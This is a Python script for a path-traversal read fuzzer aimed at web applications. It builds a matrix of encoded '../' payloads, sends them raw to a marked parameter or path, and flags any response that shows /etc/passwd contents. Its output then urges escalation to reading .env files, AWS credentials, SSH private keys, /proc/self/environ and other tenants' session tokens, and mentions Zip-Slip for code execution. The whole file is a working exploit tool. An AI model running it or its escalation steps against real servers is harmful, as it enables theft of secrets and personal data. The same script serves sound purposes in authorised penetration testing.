#!/usr/bin/env python3
"""
pt_read_fuzz.py - control-baselined path-traversal READ fuzzer.
Sprays the traversal + encoding + server-normalization matrix at a FUZZ-marked parameter (or path), sends the
`../` RAW (never collapsed client-side), and flags any payload whose response contains a marker unique to the
target file (e.g. "root:x:0:0" for /etc/passwd). Control-baselined: it first records the NORMAL response so a
site that always returns the same page isn't reported as a hit.

READ sinks disclose bytes (no wrapper/log-poison RCE - that's the LFI kit). Climb from /etc/passwd to SECRETS
(.env/config/keys/cloud-creds/source) before reporting (PATH_TRAVERSAL_TESTING_GUIDE.md section 10). Authorized
testing only.

Usage:
  python3 pt_read_fuzz.py -u "https://target/download?file=FUZZ" --read /etc/passwd --marker "root:x:0:0"
  python3 pt_read_fuzz.py -u "https://target/static/FUZZ" --read /etc/passwd --marker "root:x:0:0" --depth 12
  python3 pt_read_fuzz.py --selftest
"""
import argparse, sys, urllib.parse

# cp1252-safe console on Windows
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except Exception:
    requests = None


def gen_payloads(target_file, depth):
    """Build the traversal matrix for a target absolute path like /etc/passwd."""
    tf = target_file.lstrip("/")           # etc/passwd
    win = "\\" in target_file or target_file[1:2] == ":"
    out = []

    # absolute (Python/.NET/Java foot-gun + CWE-36) - try FIRST, cheapest
    out.append(target_file)
    out.append("file://" + target_file)

    # varying-depth relative
    for d in range(1, depth + 1):
        up = "../" * d
        out.append(up + tf)
    # over-traversal fixed deep
    out.append("../" * (depth + 4) + tf)

    # strip-and-reform (non-recursive filters)
    out.append("....//" * depth + tf)
    out.append(".../" * depth + tf)

    # URL-encoded /
    out.append("..%2f" * depth + tf.replace("/", "%2f"))
    # encoded dots + slash
    out.append("%2e%2e%2f" * depth + tf.replace("/", "%2f"))
    # double-encoded (beats decode-once / WAF)
    out.append("%252e%252e%252f" * depth + tf.replace("/", "%252f"))
    # overlong UTF-8 (legacy IIS)
    out.append("..%c0%af" * depth + tf.replace("/", "%c0%af"))

    # server-normalization style (these usually go in the PATH, not a param value)
    out.append("..;/" * depth + tf)          # Tomcat/Java

    # Windows variants
    if not win:
        # also offer windows separators in case target is windows despite unix-looking marker
        out.append("..\\" * depth + tf.replace("/", "\\"))
        out.append("..%5c" * depth + tf.replace("/", "%5c"))
    else:
        out.append("..\\" * depth + tf)
        out.append("..%5c" * depth + tf)

    # dedup preserve order
    seen, uniq = set(), []
    for p in out:
        if p not in seen:
            seen.add(p); uniq.append(p)
    return uniq


def build_url(template, payload):
    """Insert payload at FUZZ (or replace the last query value). Returns (url, is_path_context).

    PATH context (FUZZ in the path) keeps the payload RAW so `../`, `..;/`, `/static../` survive verbatim - but
    a normal HTTP client (requests/urllib3) COLLAPSES literal `/../` before sending, so path-context requests are
    sent via a raw socket (send_raw) to behave like `curl --path-as-is`. QUERY context url-encodes the value
    (the server decodes it), which requests transmits faithfully."""
    if "FUZZ" in template:
        is_query = "?" in template and template.index("?") < template.index("FUZZ")
        if is_query:
            return template.replace("FUZZ", urllib.parse.quote(payload, safe="%")), False
        # path context: raw payload, sent via raw socket so it is NOT normalized client-side
        return template.replace("FUZZ", payload), True
    parts = urllib.parse.urlsplit(template)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if q:
        q[-1] = (q[-1][0], payload)
    else:
        q = [("file", payload)]
    url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                   urllib.parse.urlencode(q), parts.fragment))
    return url, False


class RawResp:
    """Minimal response shim (status_code, headers, text) for the raw-socket path."""
    def __init__(self, status, headers, text):
        self.status_code = status
        self.headers = headers
        self.text = text


def send_raw(url, timeout):
    """Send a GET with the path AS-IS over a raw socket (like curl --path-as-is) so `/../`/`..;/` are not
    collapsed by the HTTP client. Handles http/https, Content-Length and chunked bodies, identity encoding."""
    import socket, ssl
    p = urllib.parse.urlsplit(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    raw_path = p.path or "/"
    if p.query:
        raw_path += "?" + p.query
    req = (f"GET {raw_path} HTTP/1.1\r\nHost: {p.netloc}\r\n"
           f"User-Agent: pt-read-fuzz (authorized)\r\nAccept-Encoding: identity\r\n"
           f"Connection: close\r\n\r\n").encode("latin-1", "replace")
    s = socket.create_connection((host, port), timeout=timeout)
    if p.scheme == "https":
        ctx = ssl._create_unverified_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    s.sendall(req)
    chunks = []
    try:
        while True:
            b = s.recv(65536)
            if not b:
                break
            chunks.append(b)
    except Exception:
        pass
    finally:
        s.close()
    data = b"".join(chunks)
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = 0
    if lines and lines[0].startswith(b"HTTP/"):
        try:
            status = int(lines[0].split()[1])
        except Exception:
            status = 0
    headers = {}
    for ln in lines[1:]:
        k, _, v = ln.partition(b":")
        headers[k.decode("latin-1").strip().lower()] = v.decode("latin-1").strip()
    # de-chunk if needed
    if headers.get("transfer-encoding", "").lower() == "chunked":
        body = _dechunk(body)
    text = body.decode("utf-8", "replace")
    return RawResp(status, headers, text)


def _dechunk(body):
    out, i = b"", 0
    try:
        while i < len(body):
            j = body.find(b"\r\n", i)
            if j < 0:
                break
            n = int(body[i:j].split(b";")[0], 16)
            if n == 0:
                break
            out += body[j + 2:j + 2 + n]
            i = j + 2 + n + 2
    except Exception:
        return body
    return out


def send(url, timeout, raw=False):
    if raw:
        return send_raw(url, timeout)
    return requests.get(url, timeout=timeout, verify=False,
                        headers={"User-Agent": "pt-read-fuzz (authorized)"}, allow_redirects=False)


def main():
    ap = argparse.ArgumentParser(description="Control-baselined path-traversal READ fuzzer.")
    ap.add_argument("-u", "--url", help="target URL; mark the injection point with FUZZ")
    ap.add_argument("--read", default="/etc/passwd", help="target file to read (default /etc/passwd)")
    ap.add_argument("--marker", default="root:x:0:0", help="unique string proving the target file was read")
    ap.add_argument("--depth", type=int, default=10, help="max ../ depth to try (default 10)")
    ap.add_argument("--timeout", type=float, default=12)
    ap.add_argument("--selftest", action="store_true", help="offline payload-generation test (no network)")
    a = ap.parse_args()

    if a.selftest:
        pl = gen_payloads("/etc/passwd", 6)
        checks = [
            ("/etc/passwd" in pl, "absolute path present"),
            (any(p.startswith("../../../") for p in pl), "relative depth present"),
            (any("....//" in p for p in pl), "strip-reform present"),
            (any("%252e%252e%252f" in p for p in pl), "double-encode present"),
            (any("..%c0%af" in p for p in pl), "overlong utf8 present"),
            (any("..;/" in p for p in pl), "tomcat ..;/ present"),
            (len(pl) == len(set(pl)), "no duplicate payloads"),
        ]
        ok = all(c for c, _ in checks)
        for c, name in checks:
            print(f"[{'PASS' if c else 'FAIL'}] {name}")
        print(f"\n{sum(c for c,_ in checks)}/{len(checks)} - generated {len(pl)} payloads")
        sys.exit(0 if ok else 1)

    if not a.url:
        ap.error("provide -u <url with FUZZ> (or --selftest)")
    if requests is None:
        sys.exit("pip install requests")

    # control baseline
    base_url, base_is_path = build_url(a.url, "does-not-exist-" + "x" * 6)
    base_len = None
    try:
        b = send(base_url, a.timeout, raw=base_is_path)
        base_len = len(b.text or "")
        base_has_marker = a.marker in (b.text or "")
        print(f"[baseline] normal value -> HTTP {b.status_code}, {base_len} bytes, "
              f"marker-in-baseline={base_has_marker}")
        if base_has_marker:
            print("[baseline] WARNING: marker already in the normal response; pick a more specific --marker.")
    except Exception as e:
        print(f"[baseline] request failed: {e}")
        base_has_marker = False

    print(f"\n== path-traversal READ fuzz: {a.url}  (read {a.read}, marker {a.marker!r}) ==\n")
    payloads = gen_payloads(a.read, a.depth)
    if base_is_path:
        print("[mode] PATH-context injection -> sending raw (curl --path-as-is behavior; no client-side collapse).")
    hits = []
    for p in payloads:
        url, is_path = build_url(a.url, p)
        try:
            r = send(url, a.timeout, raw=is_path)
        except Exception as e:
            print(f"[err ] {p[:44]!r}: {e}")
            continue
        body = r.text or ""
        if a.marker in body and not base_has_marker:
            hits.append(p)
            print(f"[HIT ] {p[:52]!r} (HTTP {r.status_code}, {len(body)} bytes) -> marker found")
    print()
    if hits:
        print(f"[!] {len(hits)} traversal payload(s) read {a.read}. Now ESCALATE - do not stop at /etc/passwd:")
        print("    - read SECRETS/SOURCE: .env, config, ~/.aws/credentials, id_rsa, /proc/self/environ, app source (sec 10)")
        print("    - read OTHER USERS'/tenant files / session tokens -> PII/ATO (sec 11)")
        print("    - server-normalization: try /static../ (nginx) and /..;/WEB-INF/ (Tomcat) on static routes (sec 8)")
        print("    - a WRITE sink (import ZIP / upload filename / save path)? -> Zip-Slip -> RCE (sec 12-14) *highest value*")
    else:
        print("[*] No read confirmed with this set. Try: --depth higher, a different --read target (.env/web.config),")
        print("    server-normalization payloads on /static, an absolute path (Python/.NET), or a WRITE sink.")


if __name__ == "__main__":
    main()
